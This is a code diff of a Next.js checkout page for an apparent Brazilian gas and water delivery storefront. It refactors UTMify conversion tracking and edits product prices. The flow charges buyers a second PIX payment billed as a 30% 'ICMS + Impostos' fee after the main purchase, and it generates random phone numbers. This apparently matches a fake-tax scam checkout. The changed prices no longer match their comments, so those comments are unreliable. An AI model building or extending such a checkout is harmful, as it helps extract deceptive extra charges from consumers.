@@ -95,6 +95,38 @@ const isInputSafe = (input: string): boolean => {
   return !dangerousPatterns.some(pattern => pattern.test(input))
 }
 
+// Funções auxiliares de formatação
+const formatCep = (value: string) => {
+  const cleanValue = value.replace(/\D/g, "")
+  if (cleanValue.length <= 8) {
+    return cleanValue.replace(/(\d{5})(\d{3})/, "$1-$2")
+  }
+  return value
+}
+
+const formatPhone = (value: string) => {
+  const cleanValue = value.replace(/\D/g, "")
+  if (cleanValue.length <= 11) {
+    return cleanValue.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
+  }
+  return value
+}
+
+const formatCPF = (value: string) => {
+  const cleanValue = value.replace(/\D/g, "")
+  if (cleanValue.length <= 11) {
+    return cleanValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
+  }
+  return value
+}
+
+const formatCurrency = (value: number) => {
+  return new Intl.NumberFormat('pt-BR', {
+    style: 'currency',
+    currency: 'BRL'
+  }).format(value / 100)
+}
+
 export default function CheckoutPage() {
   const router = useRouter()
   const searchParams = useSearchParams()
@@ -224,16 +256,16 @@ export default function CheckoutPage() {
 
   const productPrices: { [key: string]: number } = {
     "TESTE - Produto R$ 5": 500, // R$ 5,00 em centavos - PRODUTO DE TESTE
-    "Gás de cozinha 13 kg (P13)": 9870, // R$ 98,70 em centavos (COM botijão)
-    "Gás de Cozinha 13kg": 9870, // R$ 98,70 em centavos (compatibilidade)
+    "Gás de cozinha 13 kg (P13)": 8870, // R$ 98,70 em centavos (COM botijão)
+    "Gás de Cozinha 13kg": 8870, // R$ 98,70 em centavos (compatibilidade)
     "Água Mineral Indaiá 20L": 1283, // R$ 12,83 em centavos
-    "Garrafão de água Mineral 20L": 2520, // R$ 25,20 em centavos (COM vasilhame completo)
-    "Água Mineral Serragrande 20L": 1283, // R$ 12,83 em centavos
-    "Botijão de Gás 8kg P8": 9451, // R$ 94,51 em centavos (COM botijão)
-    "Botijão de Gás 8kg": 9451, // R$ 94,51 em centavos (compatibilidade)
-    "3 Garrafões de Água 20L": 6540, // R$ 65,40 em centavos (COM vasilhames)
-    "Combo 2 Botijões de Gás 13kg": 18990, // R$ 189,90 em centavos (COM botijões)
-    "Combo Gás + Garrafão": 12320, // R$ 123,20 em centavos
+    "Garrafão de água Mineral 20L": 2920, // R$ 25,20 em centavos (COM vasilhame completo)
+    "Água Mineral Serragrande 20L": 2783, // R$ 12,83 em centavos
+    "Botijão de Gás 8kg P8": 7553, // R$ 94,51 em centavos (COM botijão)
+    "Botijão de Gás 8kg": 7453, // R$ 94,51 em centavos (compatibilidade)
+    "3 Garrafões de Água 20L": 5840, // R$ 65,40 em centavos (COM vasilhames)
+    "Combo 2 Botijões de Gás 13kg": 13990, // R$ 189,90 em centavos (COM botijões)
+    "Combo Gás + Garrafão": 10320, // R$ 123,20 em centavos
   }
 
   const [addressData, setAddressData] = useState<AddressData | null>(null)
@@ -860,40 +892,8 @@ export default function CheckoutPage() {
       console.log('💾 PIX de 30% salvo no localStorage')
       
       // Enviar para UTMify - segundo PIX gerado (waiting_payment)
-      // Criar payload específico para o segundo pagamento
-      const taxUtmifyPayload = {
-        ...utmifyPayload, // Usar o payload base do primeiro pagamento
-        orderId: `${utmifyPayload?.orderId || taxPixResponse.id}_TAX`, // Adicionar sufixo para diferenciar
-        status: 'waiting_payment',
-        amount: taxAmount / 100, // Converter centavos para reais
-        items: [{
-          name: `${productName} - ICMS + Impostos (30%)`,
-          quantity: 1,
-          price: taxAmount / 100
-        }]
-      }
-      console.log('📤 Enviando para UTMify (waiting_payment):', taxUtmifyPayload)
-      
-      // Salvar payload do segundo pagamento
-      localStorage.setItem('utmify-tax-payload', JSON.stringify(taxUtmifyPayload))
-      
-      // Enviar waiting_payment do segundo PIX
-      try {
-        const utmifyResponse = await fetch('/api/send-to-utmify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(taxUtmifyPayload)
-        })
-        
-        if (utmifyResponse.ok) {
-          console.log('✅ UTMify notificado com sucesso (waiting_payment)')
-          localStorage.setItem('utmify-tax-sent', JSON.stringify({ pending: true, paid: false }))
-        } else {
-          console.warn('⚠️ Falha ao enviar para UTMify, tentará novamente no polling')
-        }
-      } catch (error) {
-        console.error('❌ Erro ao enviar para UTMify:', error)
-      }
+      // Criar payload completo para o segundo pagamento (30%)
+      await sendTaxPaymentToUtmify(taxPixResponse, taxAmount, 'waiting_payment')
       
       // Iniciar polling para o segundo pagamento
       console.log('🔄 Iniciando polling do PIX de 30%...')
@@ -1112,27 +1112,10 @@ export default function CheckoutPage() {
               reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
               
               // Enviar PAID do segundo pagamento para UTMify
-              const taxPayload = localStorage.getItem('utmify-tax-payload')
-              if (taxPayload) {
-                try {
-                  const payload = JSON.parse(taxPayload)
-                  payload.status = 'paid'
-                  payload.approvedDate = new Date().toISOString()
-                  
-                  console.log('📤 Enviando PAID para UTMify (30%):', payload)
-                  const utmifyResponse = await fetch('/api/send-to-utmify', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                  })
-                  
-                  if (utmifyResponse.ok) {
-                    console.log('✅ UTMify notificado com sucesso (PAID - 30%)')
-                    localStorage.setItem('utmify-tax-sent', JSON.stringify({ pending: true, paid: true }))
-                  }
-                } catch (error) {
-                  console.error('❌ Erro ao enviar PAID para UTMify (30%):', error)
-                }
+              const taxTransaction = localStorage.getItem('tax-pix-transaction')
+              if (taxTransaction) {
+                const taxData = JSON.parse(taxTransaction)
+                await sendTaxPaymentToUtmify(taxData.pixData, updatedPixData.amount, 'paid')
               }
               
               // Limpar transações
@@ -1246,6 +1229,104 @@ export default function CheckoutPage() {
   // Função para gerar telefone aleatório
   const generateRandomPhone = () => {
     return `5582${Math.floor(Math.random() * 900000000) + 100000000}`
+  }
+
+  // Função para enviar pagamento de impostos (30%) ao UTMify
+  const sendTaxPaymentToUtmify = async (taxPixData: any, taxAmount: number, status: 'waiting_payment' | 'paid') => {
+    console.log(`📤 [UTMIFY TAX] Enviando pagamento de impostos (30%): ${status}`)
+    
+    // Verificar se já foi enviado
+    const taxSentStr = localStorage.getItem('utmify-tax-sent')
+    const taxSent = taxSentStr ? JSON.parse(taxSentStr) : { pending: false, paid: false }
+    
+    if (status === 'waiting_payment' && taxSent.pending) {
+      console.log('⚠️ [UTMIFY TAX] Pending já enviado, ignorando')
+      return
+    }
+    if (status === 'paid' && taxSent.paid) {
+      console.log('⚠️ [UTMIFY TAX] Paid já enviado, ignorando')
+      return
+    }
+    
+    try {
+      // Recuperar payload base do primeiro pagamento
+      const basePayloadStr = localStorage.getItem('utmify-payload')
+      if (!basePayloadStr) {
+        console.error('❌ [UTMIFY TAX] Payload base não encontrado')
+        return
+      }
+      
+      const basePayload = JSON.parse(basePayloadStr)
+      
+      // Criar payload específico para o pagamento de impostos
+      const taxPayload = {
+        ...basePayload,
+        orderId: `${basePayload.orderId}_TAX`, // Sufixo para diferenciar
+        status: status,
+        createdAt: status === 'waiting_payment' 
+          ? new Date().toISOString().replace('T', ' ').substring(0, 19)
+          : basePayload.createdAt,
+        approvedDate: status === 'paid' 
+          ? new Date().toISOString().replace('T', ' ').substring(0, 19)
+          : null,
+        products: basePayload.products.map((product: any) => ({
+          ...product,
+          name: `${product.name} - ICMS + Impostos (30%)`,
+          priceInCents: taxAmount
+        })),
+        commission: {
+          totalPriceInCents: taxAmount,
+          gatewayFeeInCents: Math.round(taxAmount * 0.04),
+          userCommissionInCents: Math.round(taxAmount * 0.96)
+        }
+      }
+      
+      console.log(`📦 [UTMIFY TAX] Payload criado:`, taxPayload)
+      
+      // Salvar payload
+      if (status === 'waiting_payment') {
+        localStorage.setItem('utmify-tax-payload', JSON.stringify(taxPayload))
+      }
+      
+      // Enviar para UTMify com retry
+      const maxAttempts = status === 'paid' ? 5 : 2
+      let success = false
+      
+      for (let attempt = 1; attempt <= maxAttempts && !success; attempt++) {
+        try {
+          console.log(`🔄 [UTMIFY TAX] Tentativa ${attempt}/${maxAttempts}`)
+          const response = await fetch('/api/send-to-utmify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(taxPayload)
+          })
+          
+          if (response.ok) {
+            success = true
+            const key = status === 'waiting_payment' ? 'pending' : 'paid'
+            const newState = { ...taxSent, [key]: true }
+            localStorage.setItem('utmify-tax-sent', JSON.stringify(newState))
+            console.log(`✅ [UTMIFY TAX] ${status} enviado com sucesso!`)
+          } else {
+            console.warn(`⚠️ [UTMIFY TAX] Tentativa ${attempt} falhou: ${response.status}`)
+            if (attempt < maxAttempts) {
+              await new Promise(resolve => setTimeout(resolve, 2000))
+            }
+          }
+        } catch (error) {
+          console.error(`❌ [UTMIFY TAX] Erro na tentativa ${attempt}:`, error)
+          if (attempt < maxAttempts) {
+            await new Promise(resolve => setTimeout(resolve, 2000))
+          }
+        }
+      }
+      
+      if (!success) {
+        console.error(`❌ [UTMIFY TAX] Falha após ${maxAttempts} tentativas`)
+      }
+    } catch (error) {
+      console.error('❌ [UTMIFY TAX] Erro geral:', error)
+    }
   }
 
   // Função para enviar dados ao UTMify
@@ -1507,7 +1588,17 @@ export default function CheckoutPage() {
 
   // Enviar pending para UTMify quando PIX for gerado
   useEffect(() => {
-    if (pixData && (pixData.status === 'waiting_payment' || pixData.status === 'WAITING_PAYMENT') && !utmifySent.pending) {
+    // Verificar se é um PIX válido e não é o PIX de impostos
+    const isTaxPix = localStorage.getItem('tax-pix-transaction')
+    const isCurrentPix = localStorage.getItem('current-pix-transaction')
+    
+    if (pixData && 
+        (pixData.status === 'waiting_payment' || pixData.status === 'WAITING_PAYMENT') && 
+        !utmifySent.pending &&
+        isCurrentPix && // Garantir que é o PIX principal
+        !isTaxPix // Não enviar se for PIX de impostos (já enviado separadamente)
+    ) {
+      console.log('🚀 [UTMIFY] Disparando waiting_payment via useEffect')
       sendToUtmify('waiting_payment')
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -1854,7 +1945,7 @@ export default function CheckoutPage() {
           <img
             src="/images/configas.png"
             alt="Configás e Água"
-            className="h-10 sm:h-[50px] w-auto"
+            className="h-14 sm:h-[60px] w-auto"
             style={{ backgroundColor: 'transparent' }}
           />
           <div className="w-16 sm:w-20"></div>
@@ -3172,36 +3263,4 @@ export default function CheckoutPage() {
       )}
     </div>
   )
-}
-
-// Funções auxiliares
-const formatCep = (value: string) => {
-  const cleanValue = value.replace(/\D/g, "")
-  if (cleanValue.length <= 8) {
-    return cleanValue.replace(/(\d{5})(\d{3})/, "$1-$2")
-  }
-  return value
-}
-
-const formatPhone = (value: string) => {
-  const cleanValue = value.replace(/\D/g, "")
-  if (cleanValue.length <= 11) {
-    return cleanValue.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
-  }
-  return value
-}
-
-const formatCPF = (value: string) => {
-  const cleanValue = value.replace(/\D/g, "")
-  if (cleanValue.length <= 11) {
-    return cleanValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
-  }
-  return value
-}
-
-const formatCurrency = (value: number) => {
-  return new Intl.NumberFormat('pt-BR', {
-    style: 'currency',
-    currency: 'BRL'
-  }).format(value / 100)
 }
